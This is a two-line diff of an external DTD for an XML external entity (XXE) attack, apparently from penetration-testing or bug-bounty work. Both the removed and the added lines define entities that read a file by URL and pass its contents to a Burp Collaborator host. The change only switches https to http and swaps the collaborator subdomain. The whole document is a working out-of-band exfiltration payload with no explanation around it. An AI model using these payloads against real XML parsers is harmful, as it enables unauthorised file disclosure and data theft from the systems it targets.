@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "https://g.vjh1.com/txt/sample1.txt">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://qrlwgqsh6hve559zuobk41hx7odrik69.burpcollaborator.net/xxe-text-file?%file;'>">
+<!ENTITY % file SYSTEM "http://g.vjh1.com/txt/sample1.txt">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://u1w0qu2lgl5if9j34sloe5r1hsnjsfi37.burpcollaborator.net/?%file;'>">
